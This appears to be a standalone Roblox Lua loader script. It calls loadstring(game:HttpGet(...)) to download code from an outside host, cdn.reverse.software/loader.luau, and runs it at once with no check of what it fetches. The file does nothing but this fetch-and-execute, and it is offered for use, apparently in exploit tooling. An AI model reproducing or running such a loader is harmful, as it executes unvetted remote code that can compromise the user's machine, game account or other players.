-- Unique ID (can be used for tracking or reference)
local ID = "933a7800-ba26-4768-889c-6db85044f14c"

-- Load and execute remote script
local success, err = pcall(function()
    loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
end)

if not success then
    warn("Failed to execute remote script: "..err)
end
